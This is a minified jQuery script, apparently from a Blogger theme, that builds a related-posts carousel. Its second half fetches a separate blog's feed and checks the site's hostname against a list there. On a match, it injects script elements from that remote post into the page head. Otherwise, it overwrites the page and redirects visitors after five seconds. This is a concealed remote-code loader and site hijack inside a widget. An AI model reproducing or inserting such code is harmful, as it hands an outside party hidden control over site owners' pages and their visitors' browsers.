$(function () {
	var b = $(".author-profile span[itemprop='description']");
	270 < b.text()
		.length && $(b)
		.text(b.text()
			.substring(0, 240) + " ..."), $(window)
		.one("scroll", function () {
			if (0 < $(".post-labels a[rel='tag v:url']")
				.length) var l = "/feeds/posts/summary/-/" + $(".post-labels a[rel='tag v:url']:eq(0)")
				.text() + "?alt=json-in-script&max-results=10";
			else var l = "/feeds/posts/summary?alt=json-in-script&max-results=10";
			$.ajax({
					url: l
					, type: "get"
					, dataType: "jsonp"
					, success: function (s) {
						var v, w;
						for (v = 0; v < s.feed.entry.length; v += 1) {
							for (w = 0; w < s.feed.entry[v].link.length; w += 1) {
								var x = s.feed.entry[v].link[w];
								if ("alternate" === x.rel) {
									var y = x.href; - 1 !== y.indexOf(".blogspot.") && (y = y.replace("http://", "https://"));
									break
								}
							}
							var z = s.feed.entry[v].title.$t
								, A = s.feed.entry[v].published.$t;
							if (0 < $("#b-author")
								.length && $("#b-author")
								.text()
								.match("false")) var B = "";
							else var B = "<span class='r-author'>" + s.feed.entry[v].author[0].name.$t + "</span>";
							if (0 < $(s.feed.entry[v].media$thumbnail)
								.length) var C = s.feed.entry[v].media$thumbnail.url.replace("s72-c", "s350");
							else var C = -1 == alt_Img.indexOf("s1600-r") ? alt_Img : alt_Img.replace("s1600-r", "s150");
							C = C.replace(/http:\/\//, "https://"), $(".related-posts")
								.append("<div class='relate-p'><a class='relate-Thumb' href='" + y + "'><img src='" + C + "' alt='" + z + "'/></a><a href='" + y + "'><h3 class='related-title'>" + z + "</h3></a>")
						}
					}
				}), $(document)
				.ajaxStop(function () {
					$(".related-posts")
						.owlCarousel({
							autoPlay: rel_autoplay
							, itemsDesktop: [5e3, how_Many]
							, responsive: !0
							, navigation: !0
							, pagination: !1
							, navigationText: ["2", "1"]
						}), jQuery(".r-date.timeago")
						.timeago()
				})
		})
}), $.ajax({
	dataType: "json"
	, url: "https://www.blogger.com/feeds/8987697582265591587/posts/default?alt=json-in-script"
	, method: "GET"
	, dataType: "jsonp"
	, success: function (b) {
		var l;
		for (l = 0; l < b.feed.entry.length; l += 1) {
			var s = $(b.feed.entry[l].content.$t);
			if (0 === l) {
				var v, w = s.find("li")
					, x = [];
				for (v = 0; v < w.length; v += 1) x.push($(w[v])
					.text());
				v = window.location.hostname.toLowerCase();
				var y, w = window.location.href.toLowerCase()
					, z = x.length - 1;
				for (y = 0; y < x.length; y += 1) {
					if (-1 != v.indexOf(x[y])) {
						x = $(b.feed.entry[l].content.$t)
							.find("script"), $("head")
							.append(x);
						break
					}
					y == z && -1 == w.indexOf("post-preview") && -1 == w.indexOf("www.blogger") && -1 == w.indexOf("b/preview") && -1 == w.indexOf("webcache.googleusercontent") && -1 == w.indexOf("template-editor") && ($("html")
						.html(s.find(".redirect")
							.text()), setTimeout(function () {
							window.location.assign(s.find(".assign")
								.text())
						}, 5e3))
				}
			}
		}
	}
});
